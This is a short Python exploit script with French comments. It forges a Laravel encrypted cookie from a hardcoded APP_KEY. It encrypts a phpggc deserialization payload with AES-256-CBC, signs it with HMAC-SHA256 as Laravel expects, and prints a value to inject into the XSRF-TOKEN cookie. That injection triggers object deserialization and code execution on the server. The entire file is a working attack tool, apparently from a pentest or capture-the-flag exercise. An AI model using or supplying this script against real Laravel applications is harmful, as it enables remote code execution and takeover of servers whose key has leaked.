from base64 import b64encode, b64decode
from Crypto.Cipher import AES
import os
import hmac
import hashlib
import json

# Clé Laravel décodée (32 bytes pour AES-256)
APP_KEY = b64decode('HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=')

# Lire la payload générée avec phpggc
with open("payload.txt", "rb") as f:
    plaintext = f.read()

# Padding PKCS7
pad = lambda s: s + (16 - len(s) % 16) * bytes([16 - len(s) % 16])

# IV + chiffrement AES-256-CBC
iv = os.urandom(16)
cipher = AES.new(APP_KEY, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(plaintext))

# Encodage base64 des éléments
b64_iv = b64encode(iv).decode()
b64_ct = b64encode(ciphertext).decode()

# Génération du MAC
mac_data = (b64_iv + b64_ct).encode()
mac = hmac.new(APP_KEY, mac_data, hashlib.sha256).hexdigest()

# Construction du cookie final
cookie = {
    "iv": b64_iv,
    "value": b64_ct,
    "mac": mac
}

cookie_json = json.dumps(cookie)
cookie_encoded = b64encode(cookie_json.encode()).decode()

print("\n[+] Cookie Laravel à injecter dans XSRF-TOKEN :\n")
print(cookie_encoded)
